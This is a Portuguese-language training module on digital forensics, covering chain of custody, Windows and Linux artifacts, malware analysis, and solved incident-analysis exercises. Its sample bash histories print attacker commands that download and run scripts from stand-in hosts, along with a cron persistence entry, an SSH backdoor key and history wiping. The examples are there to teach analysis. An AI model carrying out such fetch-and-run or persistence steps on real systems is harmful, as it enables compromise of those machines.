# 📖 Módulo 4: Análise Forense Digital

## 🎯 Objetivos do Módulo

- Entender fundamentos de análise forense
- Aprender coleta de evidências digitais
- Analisar artefatos de segurança
- Investigar incidentes de segurança

---

## 4.1 Conceitos Fundamentais

### O que é Análise Forense Digital?

**Definição**: Processo de identificar, preservar, analisar e apresentar evidências digitais para investigação e resolução de incidentes de segurança.

```
Ciclo de Vida Forense:

1️⃣ IDENTIFICAÇÃO
   └─ Reconhecer que há evidência digital

2️⃣ PRESERVAÇÃO
   └─ Manter integridade da evidência (chain of custody)

3️⃣ COLETA
   └─ Extrair evidências seguindo protocolo

4️⃣ ANÁLISE
   └─ Examinar e correlacionar evidências

5️⃣ DOCUMENTAÇÃO
   └─ Registrar procedimentos e achados

6️⃣ APRESENTAÇÃO
   └─ Comunicar resultados para stakeholders
```

### Cadeia de Custódia (Chain of Custody)

```
Importância: CRÍTICA para validade legal
├─ Prova que evidência não foi alterada
├─ Documenta quem acessou e quando
└─ Permitida em corte de justiça

Exemplo de Protocolo:
Time: 2026-06-03 10:00:00 UTC
Item: Disco rígido Samsung 1TB
Serial: XYZ123456789
Coletado por: Investigador João Silva
Armazenado em: Sala segura, armário 3, prateleira 2
Assinado por: João Silva
Testemunha: Maria Santos
```

---

## 4.2 Artefatos Forenses Comuns

### Windows Artifacts

#### Registry (Registro do Windows)

```
Localização: C:\Windows\System32\config\

Arquivos Importantes:
- SAM: Senhas locais com hash
- SYSTEM: Informações do sistema
- SOFTWARE: Programas instalados
- NTUSER.DAT: Histórico do usuário

Análise:
Registry.exe ou Regedit (análise offline)
ferramentas: RegRipper, Registry Viewer

Informações Extraíveis:
✅ Programas executados
✅ Conexões USB detectadas
✅ Últimas páginas web visitadas
✅ Hora de execução de programas
```

#### Prefetch Files

```
Localização: C:\Windows\Prefetch\

Formato: *.pf (Prefetch)

Informações:
- Nome do programa executado
- Data/hora primeira execução
- Data/hora última execução
- Número de execuções
- Arquivos e DLLs carregados

Exemplo:
NOTEPAD.EXE-D44A34D0.pf
├─ Programa: Notepad
├─ Primeira execução: 2026-05-15 14:32:00
├─ Última execução: 2026-06-03 09:45:00
└─ Execuções: 47 vezes
```

#### Event Viewer Logs

```
Localização: C:\Windows\System32\winevt\Logs\

Tipos de Log:
- Security: Logins, acesso a recursos
- System: Eventos do sistema, driver
- Application: Programas instalados/removidos
- PowerShell: Comandos executados

Exemplo de Log Suspeito:
Event ID 4625: Login Failed (Falha de login)
├─ Usuario: Administrator
├─ Razão: Invalid Password
├─ Tentativas: 1500 em 5 minutos ← DDoS de Login!
├─ IP Origem: 192.168.1.100
└─ Timestamp: 2026-06-03 14:30:00

Análise: Ataque de força bruta contra Admin
```

### Linux Artifacts

#### Bash History

```
Arquivo: ~/.bash_history

Conteúdo: Comandos executados pelo usuário

Exemplo Suspeito:
ls -la
cd /tmp
wget http://attacker.com/malware.sh
chmod +x malware.sh
./malware.sh
ps aux | grep malware

Análise Forense:
- 1º: Usuário listou arquivos (reconnaissance)
- 2º: Moveu para /tmp (upload sem rastrear)
- 3º: Baixou arquivo malicioso
- 4º: Tornou executável
- 5º: Executou malware
- 6º: Procurou processos (cover tracks)
```

#### Syslog

```
Arquivo: /var/log/syslog ou /var/log/messages

Informações:
- Conexões SSH
- Comandos sudo
- Criação/deleção de arquivos
- Erros do sistema

Exemplo:
Jun  3 14:22:01 server sshd[1234]: Failed password for root from 10.0.0.50 port 5555 ssh2
Jun  3 14:22:02 server sshd[1235]: Failed password for root from 10.0.0.50 port 5556 ssh2
├─ Ataque de força bruta contra SSH
├─ Origem: 10.0.0.50
└─ Tentativas contínuas
```

---

## 4.3 Análise de Malware

### Tipos de Análise

#### Análise Estática

```
Definição: Examina malware SEM executar

Vantagens:
✅ Seguro (sem execução)
✅ Rápido
✅ Revela código-fonte

Desvantagens:
❌ Código obfuscado difícil
❌ Perde comportamento runtime

Ferramentas:
- IDA Pro
- Ghidra
- Radare2
- strings (Linux)

Exemplo:
$ strings malware.exe | grep "http"
http://attacker.com/C2
http://attacker.com/steal

Análise: Malware contata servidor malicioso
```

#### Análise Dinâmica

```
Definição: Examina malware DURANTE execução (em sandbox)

Vantagens:
✅ Vê comportamento real
✅ Detecta ofuscação
✅ Identifica C2 communications

Desvantagens:
❌ Requer sandbox seguro
❌ Malware pode detectar VM
❌ Mais lento

Ferramentas:
- Cuckoo Sandbox
- Any.run
- VMware com monitoramento

Eventos Monitorados:
- Criação de arquivo
- Criação de processo
- Acesso a registry
- Conexões de rede
- Injeção de código (DLL injection)
```

---

## 📝 Exercícios - Módulo 4

### Exercício 4.1: Análise de Evento de Login Suspeito

**Cenário**: Encontrado o seguinte evento no Windows Event Viewer:

```
Event ID: 4625 (Failed Login)
Timestamp: 2026-06-03 03:00:00 UTC
Username: Administrator
Computer: SERVIDOR-001
Source IP: 203.0.113.45
Process: winlogon.exe

Logs Subsequentes (5 minutos depois):
Event ID: 4624 (Successful Login)
Timestamp: 2026-06-03 03:05:00 UTC
Username: Administrator
Computer: SERVIDOR-001
Source IP: 203.0.113.45
Logon Type: 3 (Network)
```

**Questão**: Analise estes eventos. O que aconteceu?

### ✅ Resolução

**Análise Forense**:

```
EVENTO 1 - FALHA DE LOGIN (03:00:00)
├─ Tipo: Event ID 4625
├─ Usuário: Administrator
├─ IP Origem: 203.0.113.45
├─ Hora: 03:00:00 (madrugada - fora do horário)
└─ Interpretação: ⚠️ Tentativa de login

Evento 2 - LOGIN BEM-SUCEDIDO (03:05:00)
├─ Tipo: Event ID 4624
├─ Usuário: Administrator
├─ IP Origem: 203.0.113.45 (MESMO IP)
├─ Logon Type 3: Network (não local)
├─ Hora: 03:05:00 (5 minutos depois)
└─ Interpretação: ⚠️⚠️ Sucesso do atacante!

ANÁLISE CORRELACIONADA:
1. IP 203.0.113.45 tentou login como Admin
2. Falha na primeira tentativa (senha incorreta?)
3. 5 minutos depois conseguiu acesso
4. Possibilidades:
   a) Ataque de força bruta (testando senhas)
   b) Atacante aprendeu senha correta nos 5 minutos
   c) Vulnerabilidade explorada

CLASSIFICAÇÃO DE RISCO:
Criticidade: 🔴 CRÍTICO

Evidências de Comprometimento:
✅ Login remoto fora de horário
✅ IP externo (não é rede corporativa)
✅ Conta administrativa comprometida
✅ Possível acesso a dados sensíveis

AÇÕES RECOMENDADAS:
1. Bloquear conta Administrator imediatamente
2. Mudar senhas de todas as contas admin
3. Verificar atividades após 03:05:00
4. Bloquear IP 203.0.113.45 no firewall
5. Investigar outros logins do mesmo IP
6. Análise forense completa do servidor
```

**Investigação Adicional**:

```
Procurar por Events posteriores:
- Event 4627: Senhas de contas alteradas?
- Event 4688: Processos executados (cmd.exe, powershell.exe)?
- Event 5140: Arquivo acessado?
- Event 4698: Tarefa agendada criada?

Query PowerShell para investigar:
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4624
    StartTime=(Get-Date).AddDays(-1)
} | Where-Object {$_.Properties[3].Value -eq '203.0.113.45'}
```

---

### Exercício 4.2: Análise de Bash History

**Cenário**: Servidor Linux foi comprometido. Encontrado bash_history suspeito:

```
cat /home/attacker/.bash_history:

$ whoami
root

$ id
uid=0(root) gid=0(root) groups=0(root)

$ wget http://malicious.ru/bot.tar.gz
$ tar -xzf bot.tar.gz
$ cd bot
$ ./install.sh

$ crontab -e
(Adicionou: */5 * * * * /opt/bot/run.sh)

$ ps aux | grep bot
root     12345  0.1  2.3 245000 23456 ?  Sl  03:00  0:05 /opt/bot/run.sh

$ netstat -tulpn | grep LISTEN
tcp  0  0  0.0.0.0:6667  0.0.0.0:*  LISTEN  12345/bot.sh

$ cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCattackerkey...

$ history -c
```

**Questão**: Extraia a análise forense:
1. Que tipo de malware foi instalado?
2. Como ele persiste no sistema?
3. Qual é a comunicação de controle remoto?

### ✅ Resolução

**Análise Completa**:

```
FASE 1: RECONNAISSANCE (Linhas 1-3)
├─ $ whoami → Verificar privilégios
├─ $ id → Confirmar UID 0 (root!)
└─ Análise: Já possui acesso root

FASE 2: MALWARE DOWNLOAD (Linhas 5-8)
├─ wget http://malicious.ru/bot.tar.gz → Download de botnet
├─ tar -xzf bot.tar.gz → Extração
├─ cd bot → Mudança de diretório
├─ ./install.sh → Execução do instalador
└─ Tipo de Malware: BOT/IRC (Internet Relay Chat)

FASE 3: PERSISTÊNCIA (Linhas 10-11)
├─ crontab -e → Editar tarefas agendadas
├─ */5 * * * * /opt/bot/run.sh → Executa a cada 5 minutos
└─ Análise: BOT reinicia a cada 5 min (muito agresivo!)

Detalhe Cron:
┌─────────────────────────┐
│ */5 → A cada 5 minutos  │
│ *   → Toda hora         │
│ *   → Todo dia do mês   │
│ *   → Todo mês          │
│ *   → Todo dia da semana│
│ Comando: /opt/bot/run.sh│
└─────────────────────────┘

FASE 4: PROCESSO ATIVO (Linhas 13-15)
├─ ps aux | grep bot → Listar processos
├─ PID: 12345
├─ Memória: 2.3% (23MB) ← Tamanho suspeito
├─ Status: Sl (backgroundSleep)
└─ Análise: BOT rodando em background

FASE 5: COMUNICAÇÃO C&C (Linhas 17-19)
├─ netstat -tulpn | grep LISTEN
├─ tcp 0.0.0.0:6667 LISTEN
├─ Protocolo: IRC (porta 6667)
├─ Propósito: Command & Control
└─ Análise: BOT aguarda comandos do atacante

C&C (Command & Control):
6667/TCP é porta padrão de IRC
Atacante se conecta e envia comandos ao bot:
- DDoS attack
- Enviar spam
- Steal files
- Execute arbitrary commands

FASE 6: BACKDOOR SSH (Linhas 21-23)
├─ cat /root/.ssh/authorized_keys
├─ Chave SSH pública inserida
├─ Chave: ssh-rsa AAAAB3...attacker...
└─ Análise: Backdoor para acesso futuro

SSH Backdoor Explained:
- Atacante adiciona sua chave pública
- Pode conectar sem saber senha root
- Acesso permanente (até ser detectado)
- Difícil de detectar (apenas arquivo de texto)

FASE 7: APAGAR RASTROS (Linhas 25-26)
├─ $ history -c
└─ Análise: Limpar histórico de comandos

```

**Resumo Forense**:

```
TIMELINE:
┌─────────────────────────────────────┐
│ 03:00 → Download botnet             │
│ 03:02 → Instalação                  │
│ 03:03 → Cron configurado (5 min)    │
│ 03:04 → BOT iniciado                │
│ 03:05 → Backdoor SSH criado         │
│ 03:06 → História apagada            │
└─────────────────────────────────────┘

INDICADORES DE COMPROMETIMENTO (IOCs):
🔴 Arquivo: /opt/bot/ (diretório inteiro)
🔴 Processo: /opt/bot/run.sh (PID pode variar)
🔴 Porta: 6667/TCP (IRC)
🔴 Arquivo: /root/.ssh/authorized_keys (chave suspeita)
🔴 Cron: */5 * * * * /opt/bot/run.sh
🔴 Arquivo: botnet malicioso em malicious.ru

AÇÕES IMEDIATAS:
1. Isolar servidor da rede
2. Matar processo: kill -9 12345
3. Remover cron: crontab -r
4. Remover diretório: rm -rf /opt/bot
5. Remover backdoor SSH
6. Fazer dump de memória para análise
7. Fazer forensic image do disco
8. Restaurar de backup limpo
```

---

## 🎓 Resumo do Módulo 4

✅ Cadeia de custódia é essencial para evidência válida em corte
✅ Windows Registry e Event Viewer contêm informações críticas
✅ Bash history revela ações de atacante
✅ Análise estática vs dinâmica servem propósitos diferentes
✅ IOCs (Indicators of Compromise) facilitam busca de malware

---

## 📚 Recursos Complementares

- [NIST Digital Forensics Guide](https://csrc.nist.gov/publications/detail/sp/800-86/final)
- [Cyber Kill Chain (Lockheed Martin)](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [SANS Forensics Checklist](https://www.sans.org/)
- [Volatility Memory Forensics](https://www.volatilityfoundation.org/)

